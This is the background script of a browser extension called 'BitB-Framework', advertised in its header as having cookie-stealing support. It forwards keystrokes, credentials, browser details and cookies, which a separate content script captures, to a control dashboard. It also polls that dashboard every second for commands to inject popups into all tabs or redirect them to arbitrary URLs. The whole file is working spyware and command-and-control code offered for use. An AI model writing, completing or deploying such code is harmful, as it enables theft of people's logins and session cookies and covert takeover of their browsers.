// =============================================
// BitB-Framework - Background Script
// Complete Clean Version + Cookie Stealing Support
// =============================================

let isActive = true;
const DASHBOARD_URL = "http://127.0.0.1:5000";

// Send data to dashboard
async function sendToDashboard(type, payload) {
  try {
    await fetch(DASHBOARD_URL + "/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: type, data: payload })
    });
  } catch (e) {
    console.log("Cannot reach dashboard");
  }
}

// Receive messages from content.js
browser.runtime.onMessage.addListener((message) => {
  if (!isActive) return;

  if (message.type === "keystroke" || 
      message.type === "credentials" || 
      message.type === "browserInfo" || 
      message.type === "cookies") {
    
    sendToDashboard(message.type, message.data);
  }
});

// Poll dashboard for commands every 1 second
async function pollCommands() {
  try {
    const response = await fetch(DASHBOARD_URL + "/get_commands");
    const commands = await response.json();

    commands.forEach((cmd) => {
      console.log("Command received from dashboard:", cmd);

      if (cmd.action === "popup") {
        browser.tabs.query({}).then((tabs) => {
          tabs.forEach((tab) => {
            browser.scripting.executeScript({
              target: { tabId: tab.id },
              func: function(message) {
                alert(message);
              },
              args: [cmd.message]
            });
          });
        });
      } 
      else if (cmd.action === "redirect") {
        browser.tabs.query({}).then((tabs) => {
          tabs.forEach((tab) => {
            browser.tabs.update(tab.id, { url: cmd.url });
          });
        });
      }
    });
  } catch (e) {
    // Dashboard not reachable, ignore silently
  }
}

// Start polling
setInterval(pollCommands, 1000);

console.log("✅ BitB-Framework Background Script Loaded (Cookies Support Added)");
